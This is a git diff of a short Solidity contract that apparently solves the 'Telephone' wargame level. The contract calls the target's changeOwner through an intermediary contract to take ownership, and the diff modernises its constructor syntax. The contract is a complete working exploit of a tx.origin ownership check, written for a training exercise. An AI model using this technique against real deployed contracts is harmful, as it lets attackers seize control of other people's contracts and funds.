@@ -1,17 +1,16 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier:MIT
 pragma solidity ^0.8.0;
 
 import './Telephone.sol';
 
-contract TelephonePoc {
-    
+contract TelephoeAttack{
+
     Telephone phone;
-    
-    function TelephonePoc(address aimAddr) public {
-        phone = Telephone(aimAddr);
+
+    constructor(address _telephone) {
+        phone = Telephone(_telephone);
     }
-    
-    function attack(address _owner) public{
+    function attack(address _owner) public {
         phone.changeOwner(_owner);
     }
 }
